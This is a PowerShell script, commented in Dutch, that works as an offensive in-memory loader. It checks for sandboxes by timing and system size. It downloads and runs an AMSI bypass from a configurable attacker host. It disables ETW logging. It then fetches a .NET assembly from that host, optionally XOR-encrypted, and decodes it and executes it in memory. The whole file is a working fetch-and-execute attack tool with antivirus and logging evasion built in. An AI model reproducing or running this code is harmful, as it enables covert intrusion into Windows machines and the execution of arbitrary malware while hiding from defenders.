param(
    [Parameter(Mandatory=$false)][string]  $Tool       = "",
    [Parameter(Mandatory=$false)][string]  $Payload    = "",
    [Parameter(Mandatory=$false)][string]  $Url        = "",
    [Parameter(Mandatory=$false)][string[]]$Arg        = @(),
    [Parameter(Mandatory=$false)][string]  $Lhost      = "[ip]",
    [Parameter(Mandatory=$false)][int]     $Port       = [port],
    [Parameter(Mandatory=$false)][string]  $XorKey     = "[xor_key]",
    [Parameter(Mandatory=$false)][string]  $EntryPoint = "",
    [Parameter(Mandatory=$false)][switch]  $NoAmsi,
    [Parameter(Mandatory=$false)][switch]  $NoEtw,
    [Parameter(Mandatory=$false)][switch]  $NoSleep
)

$base = "http://${Lhost}:${Port}"

# Sandbox-detectie via timing en omgevingschecks
if (-not $NoSleep) {
    try {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        [Threading.Thread]::Sleep(1500)
        $sw.Stop()
        if ($sw.ElapsedMilliseconds -lt 800) { exit 0 }
    } catch { }
    try {
        $ram = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory
        if ($null -ne $ram -and $ram -lt 2GB) { exit 0 }
        if ((Get-Process -ErrorAction SilentlyContinue).Count -lt 15) { exit 0 }
    } catch { }
}

# AMSI bypass laden van attacker server
if (-not $NoAmsi) {
    try {
        $wc0 = New-Object Net.WebClient
        $wc0.Proxy = [Net.WebRequest]::DefaultWebProxy
        $wc0.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $wc0.DownloadString("$base/payloads/amsi-bypass.ps1") | IEX
    } catch { }
}

# ETW bypass
if (-not $NoEtw) {
    try {
        $t = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        $f = $t.GetField('etwProvider', 'NonPublic,Static')
        $p = $f.GetValue($null)
        [Void]$p.GetType().GetField('m_enabled', 'NonPublic,Instance').SetValue($p, [Byte]0)
    } catch { }
}

# Bepaal download-URL
if ($Url) {
    $dlTarget = $Url
} elseif ($Tool -or $Payload) {
    $src  = if ($Tool) { 'tools' } else { 'payloads' }
    $name = if ($Tool) { $Tool  } else { $Payload }
    $dlTarget = if ($XorKey -ne '') {
        "$base/api/invoke-assembly/xor/$src/${name}?key=$XorKey"
    } else {
        "$base/$src/$name"
    }
} else {
    exit 1
}

# Download: proxy-aware WebClient met IWR-fallback
$rawBytes = $null
try {
    if ($dlTarget.StartsWith('\\')) {
        $rawBytes = [IO.File]::ReadAllBytes($dlTarget)
    } else {
        $wc = New-Object Net.WebClient
        $wc.Proxy = [Net.WebRequest]::DefaultWebProxy
        $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        $rawBytes = $wc.DownloadData($dlTarget)
    }
} catch {
    try {
        if ($dlTarget.StartsWith('\\')) {
            $rawBytes = [IO.File]::ReadAllBytes($dlTarget)
        } else {
            $rawBytes = (Invoke-WebRequest -Uri $dlTarget -UseBasicParsing -TimeoutSec 30).Content
        }
    } catch { exit 1 }
}

# XOR deobfuscatie
if ($XorKey -ne '' -and $null -ne $rawBytes) {
    $kb    = [byte[]]([regex]::Matches($XorKey,'..') | ForEach-Object { [Convert]::ToInt32($_.Value,16) })
    $bytes = New-Object byte[] $rawBytes.Length
    for ($i = 0; $i -lt $rawBytes.Length; $i++) { $bytes[$i] = $rawBytes[$i] -bxor $kb[$i % $kb.Length] }
} else {
    $bytes = $rawBytes
}

# Laden en uitvoeren
try {
    $asm = [AppDomain]::CurrentDomain.Load($bytes)
    $ep  = if ($EntryPoint) {
        $asm.GetType($EntryPoint).GetMethod('Main', [Reflection.BindingFlags]56)
    } else {
        $asm.EntryPoint
    }
    if ($null -eq $ep) { exit 1 }
    $ep.Invoke($null, $(if ($Arg.Count -gt 0) { @(,[string[]]$Arg) } else { $null }))
} catch { }
